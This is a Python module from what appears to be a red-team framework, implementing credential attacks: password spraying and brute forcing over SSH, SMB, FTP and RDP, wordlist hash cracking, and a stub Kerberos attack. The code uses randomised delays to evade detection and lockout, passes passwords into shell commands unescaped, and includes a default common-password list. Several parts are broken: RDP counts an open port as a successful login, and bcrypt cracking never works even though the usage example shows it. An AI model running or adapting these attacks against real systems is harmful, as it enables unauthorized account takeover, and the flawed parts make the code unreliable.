"""
Credential Attacks Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Credential Attacks module performs active credential-based attacks including password
spraying, brute forcing, and hash cracking. This module is critical for gaining access
when credentials are unknown or need to be cracked.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.credential_attacks import CredentialAttacks
    
    # Initialize logger and module
    logger = FrameworkLogger("cred_attack")
    cred_attack = CredentialAttacks(logger)
    
    # Password spraying attack
    spray_result = cred_attack.password_spray(
        target="192.168.1.100",
        usernames=["admin", "administrator", "user"],
        password="Password123",
        service="ssh"
    )
    print(f"Successful logins: {spray_result['successful_logins']}")
    
    # Brute force attack
    brute_result = cred_attack.brute_force(
        target="192.168.1.100",
        username="admin",
        password_list=["password", "123456", "admin"],
        service="ssh"
    )
    print(f"Valid credentials: {brute_result['valid_credentials']}")
    
    # Hash cracking
    crack_result = cred_attack.crack_hash(
        hash_value="$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy",
        hash_type="bcrypt",
        wordlist_path="/path/to/wordlist.txt"
    )
    print(f"Cracked password: {crack_result['password']}")

Red Team Use Cases:
- Password spraying against multiple accounts
- Brute forcing single accounts
- Cracking password hashes
- Testing password policies
- Kerberos pre-authentication attacks
- NTLM authentication attacks
- SSH key authentication attacks
"""

from typing import Dict, List, Optional
import time
import socket
import subprocess
import hashlib
import platform
import base64
import random
from pathlib import Path
from utils.logger import FrameworkLogger


class CredentialAttacks:
    """Credential attacks module"""
    
    def __init__(self, logger: FrameworkLogger):
        """
        Initialize credential attacks module
        
        Args:
            logger: Logger instance
        """
        self.logger = logger
        self.attack_history = []
        self.successful_logins = []
    
    def password_spray(self, target: str, usernames: List[str], password: str, 
                       service: str = "ssh", delay: float = 1.0) -> Dict:
        """
        Perform password spraying attack
        
        Args:
            target: Target IP address or hostname
            usernames: List of usernames to test
            password: Single password to test against all usernames
            service: Service to attack (ssh, smb, ftp, rdp, ldap)
            delay: Delay between attempts (seconds)
        
        Returns:
            Dictionary containing spraying results
        """
        self.logger.info(f"Starting password spray attack against {target} ({service})")
        
        results = {
            "status": "completed",
            "target": target,
            "service": service,
            "password": password,
            "usernames_tested": len(usernames),
            "successful_logins": [],
            "failed_logins": [],
            "timestamp": time.time()
        }
        
        for username in usernames:
            try:
                # Attempt authentication
                auth_result = self._authenticate(target, username, password, service)
                
                if auth_result["success"]:
                    self.logger.warning(f"Successful login: {username}:{password}")
                    self.successful_logins.append({
                        "username": username,
                        "password": password,
                        "service": service,
                        "target": target,
                        "timestamp": time.time()
                    })
                    results["successful_logins"].append({
                        "username": username,
                        "password": password
                    })
                else:
                    results["failed_logins"].append(username)
                
                # Stealthy delay to avoid lockouts and detection
                # Add random jitter to delay for more natural timing
                jittered_delay = delay + random.uniform(-0.2, 0.5)  # Add random jitter
                jittered_delay = max(0.5, jittered_delay)  # Ensure minimum 0.5s
                time.sleep(jittered_delay)
                
            except Exception as e:
                self.logger.error(f"Password spray failed for {username}: {e}")
                results["failed_logins"].append(username)
        
        self.attack_history.append({
            "attack_type": "password_spray",
            "target": target,
            "results": results
        })
        
        return results
    
    def brute_force(self, target: str, username: str, password_list: List[str],
                   service: str = "ssh", delay: float = 0.5, max_attempts: Optional[int] = None) -> Dict:
        """
        Perform brute force attack
        
        Args:
            target: Target IP address or hostname
            username: Username to brute force
            password_list: List of passwords to try
            service: Service to attack (ssh, smb, ftp, rdp, ldap)
            delay: Delay between attempts (seconds)
            max_attempts: Maximum attempts before stopping (None = unlimited)
        
        Returns:
            Dictionary containing brute force results
        """
        self.logger.info(f"Starting brute force attack against {target} ({service}) for user {username}")
        
        results = {
            "status": "completed",
            "target": target,
            "service": service,
            "username": username,
            "passwords_tested": 0,
            "valid_credentials": None,
            "attempts": [],
            "timestamp": time.time()
        }
        
        attempts = 0
        for password in password_list:
            if max_attempts and attempts >= max_attempts:
                self.logger.warning(f"Max attempts ({max_attempts}) reached")
                results["status"] = "max_attempts_reached"
                break
            
            try:
                auth_result = self._authenticate(target, username, password, service)
                attempts += 1
                results["passwords_tested"] = attempts
                
                results["attempts"].append({
                    "password": password[:3] + "***",  # Mask password in results
                    "success": auth_result["success"]
                })
                
                if auth_result["success"]:
                    self.logger.warning(f"Valid credentials found: {username}:{password}")
                    results["valid_credentials"] = {
                        "username": username,
                        "password": password
                    }
                    self.successful_logins.append({
                        "username": username,
                        "password": password,
                        "service": service,
                        "target": target,
                        "timestamp": time.time()
                    })
                    break
                
                # Stealthy delay with random jitter to avoid detection
                jittered_delay = delay + random.uniform(-0.1, 0.3)  # Add random jitter
                jittered_delay = max(0.2, jittered_delay)  # Ensure minimum 0.2s
                time.sleep(jittered_delay)
                
            except Exception as e:
                self.logger.error(f"Brute force attempt failed: {e}")
                attempts += 1
        
        self.attack_history.append({
            "attack_type": "brute_force",
            "target": target,
            "results": results
        })
        
        return results
    
    def crack_hash(self, hash_value: str, hash_type: str, 
                   wordlist_path: Optional[str] = None) -> Dict:
        """
        Attempt to crack password hash
        
        Args:
            hash_value: Hash to crack
            hash_type: Type of hash (md5, sha1, sha256, bcrypt, ntlm, etc.)
            wordlist_path: Path to wordlist file (optional, uses common passwords if not provided)
        
        Returns:
            Dictionary containing cracking results
        """
        self.logger.info(f"Attempting to crack {hash_type} hash")
        
        results = {
            "status": "not_cracked",
            "hash_type": hash_type,
            "hash_value": hash_value,
            "password": None,
            "attempts": 0,
            "timestamp": time.time()
        }
        
        # Generate wordlist
        wordlist = self._generate_wordlist(wordlist_path)
        
        for password in wordlist:
            try:
                # Hash the password and compare
                if self._verify_hash(hash_value, password, hash_type):
                    results["status"] = "cracked"
                    results["password"] = password
                    self.logger.warning(f"Hash cracked: {password}")
                    break
                
                results["attempts"] += 1
                
            except Exception as e:
                self.logger.error(f"Hash cracking error: {e}")
        
        self.attack_history.append({
            "attack_type": "hash_cracking",
            "hash_type": hash_type,
            "results": results
        })
        
        return results
    
    def kerberos_preauth_attack(self, target: str, username: str, 
                               password_list: List[str]) -> Dict:
        """
        Perform Kerberos pre-authentication attack
        
        Args:
            target: Domain controller IP or hostname
            username: Username to test
            password_list: List of passwords to try
        
        Returns:
            Dictionary containing attack results
        """
        self.logger.info(f"Starting Kerberos pre-auth attack against {target}")
        
        results = {
            "status": "completed",
            "target": target,
            "username": username,
            "valid_password": None,
            "attempts": len(password_list),
            "timestamp": time.time()
        }
        
        # Attempt Kerberos authentication
        for password in password_list:
            try:
                # Simulate Kerberos pre-auth (would use actual Kerberos library)
                # This is a placeholder for real implementation
                auth_result = self._authenticate(target, username, password, "kerberos")
                
                if auth_result["success"]:
                    results["valid_password"] = password
                    self.successful_logins.append({
                        "username": username,
                        "password": password,
                        "service": "kerberos",
                        "target": target,
                        "timestamp": time.time()
                    })
                    break
                    
            except Exception as e:
                self.logger.error(f"Kerberos attack failed: {e}")
        
        return results
    
    def _authenticate(self, target: str, username: str, password: str, service: str) -> Dict:
        """Attempt authentication against service"""
        try:
            if service == "ssh":
                return self._authenticate_ssh(target, username, password)
            elif service == "smb":
                return self._authenticate_smb(target, username, password)
            elif service == "ftp":
                return self._authenticate_ftp(target, username, password)
            elif service == "rdp":
                return self._authenticate_rdp(target, username, password)
            elif service == "ldap":
                return self._authenticate_ldap(target, username, password)
            elif service == "kerberos":
                return self._authenticate_kerberos(target, username, password)
            else:
                return {"success": False, "error": f"Unknown service: {service}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _authenticate_ssh(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via SSH"""
        try:
            if platform.system() == "Windows":
                # Windows: Use OpenSSH client (if installed) or PowerShell remoting
                # Check if OpenSSH client is available
                try:
                    # Try OpenSSH client (available on Windows 10+)
                    cmd = f'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {username}@{target} "exit"'
                    # Use PowerShell to pass password securely
                    ps_cmd = f'$pass = ConvertTo-SecureString "{password}" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("{username}", $pass); ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {username}@{target} "exit"'
                    # Fallback: Try simple SSH with password via expect-like behavior
                    # Note: This requires OpenSSH to be installed
                    result = subprocess.run(["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=3", 
                                           f"{username}@{target}", "exit"], 
                                          capture_output=True, timeout=5, input=f"{password}\n".encode())
                    return {"success": result.returncode == 0}
                except FileNotFoundError:
                    # Try PowerShell remoting as alternative
                    try:
                        ps_cmd = f'$pass = ConvertTo-SecureString "{password}" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("{username}", $pass); Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ exit }}'
                        result = subprocess.run(["powershell", "-Command", ps_cmd], 
                                              capture_output=True, timeout=5)
                        return {"success": result.returncode == 0}
                    except Exception:
                        return {"success": False, "note": "SSH requires OpenSSH client or PowerShell remoting"}
            else:
                # Linux/macOS: Use sshpass
                cmd = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {username}@{target} "exit"'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                return {"success": result.returncode == 0}
        except Exception:
            return {"success": False}
    
    def _authenticate_smb(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via SMB"""
        try:
            if platform.system() == "Windows":
                # Windows: Use net use command
                share_path = f"\\\\{target}\\IPC$"
                # Try to map a drive with credentials
                cmd = f'net use {share_path} /user:{username} {password}'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                # Disconnect after testing
                subprocess.run(f'net use {share_path} /delete /y', shell=True, capture_output=True, timeout=2)
                # Check if command succeeded (exit code 0 or error message indicates success)
                if result.returncode == 0 or "successfully" in result.stdout.decode('utf-8', errors='ignore').lower():
                    return {"success": True}
                return {"success": False}
            else:
                # Linux/macOS: Use smbclient
                cmd = f'smbclient -U "{username}%{password}" //{target}/IPC$ -N -c "exit"'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                return {"success": result.returncode == 0}
        except Exception:
            return {"success": False}
    
    def _authenticate_ftp(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via FTP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, 21))
            
            response = sock.recv(1024).decode()
            if "220" in response:
                sock.send(f"USER {username}\r\n".encode())
                response = sock.recv(1024).decode()
                
                if "331" in response:
                    sock.send(f"PASS {password}\r\n".encode())
                    response = sock.recv(1024).decode()
                    sock.close()
                    return {"success": "230" in response}
            
            sock.close()
            return {"success": False}
        except Exception:
            return {"success": False}
    
    def _authenticate_rdp(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via RDP"""
        try:
            if platform.system() == "Windows":
                # Windows: Check if RDP port is open and accessible
                # Try to connect to RDP port (3389)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target, 3389))
                sock.close()
                
                if result == 0:
                    # Port is open - RDP is available
                    # Note: Actual RDP authentication requires mstsc.exe or specialized tools
                    # We can't fully authenticate without GUI, but we can verify port is open
                    return {"success": True, "note": "RDP port accessible, authentication requires GUI"}
                else:
                    return {"success": False, "note": "RDP port not accessible"}
            else:
                # Linux/macOS: Use xfreerdp or rdesktop
                try:
                    cmd = f'xfreerdp /u:{username} /p:{password} /v:{target} /cert:ignore /connect-timeout:3000'
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                    # RDP authentication is complex, this is simplified
                    return {"success": False, "note": "RDP authentication requires specialized tools"}
                except FileNotFoundError:
                    return {"success": False, "note": "xfreerdp not installed"}
        except Exception:
            return {"success": False}
    
    def _authenticate_ldap(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via LDAP"""
        try:
            # LDAP authentication requires specialized library
            # This is a placeholder
            return {"success": False, "note": "LDAP authentication requires ldap3 library"}
        except Exception:
            return {"success": False}
    
    def _authenticate_kerberos(self, target: str, username: str, password: str) -> Dict:
        """Authenticate via Kerberos"""
        try:
            # Kerberos authentication requires specialized tools
            # This is a placeholder
            return {"success": False, "note": "Kerberos authentication requires specialized tools"}
        except Exception:
            return {"success": False}
    
    def _generate_wordlist(self, wordlist_path: Optional[str] = None) -> List[str]:
        """Generate or load wordlist"""
        if wordlist_path and Path(wordlist_path).exists():
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.logger.error(f"Failed to load wordlist: {e}")
        
        # Common passwords as fallback
        return [
            "password", "123456", "password123", "admin", "administrator",
            "12345678", "qwerty", "abc123", "Password1", "Welcome123",
            "root", "toor", "letmein", "passw0rd", "Password123"
        ]
    
    def _verify_hash(self, hash_value: str, password: str, hash_type: str) -> bool:
        """Verify password against hash"""
        try:
            if hash_type == "md5":
                return hashlib.md5(password.encode()).hexdigest() == hash_value
            elif hash_type == "sha1":
                return hashlib.sha1(password.encode()).hexdigest() == hash_value
            elif hash_type == "sha256":
                return hashlib.sha256(password.encode()).hexdigest() == hash_value
            elif hash_type == "ntlm":
                return hashlib.new('md4', password.encode('utf-16le')).hexdigest() == hash_value
            else:
                # For bcrypt and other complex hashes, would need specialized library
                return False
        except Exception:
            return False
    
    def get_successful_logins(self) -> List[Dict]:
        """Get all successful logins"""
        return self.successful_logins
    
    def get_attack_history(self) -> List[Dict]:
        """Get attack history"""
        return self.attack_history

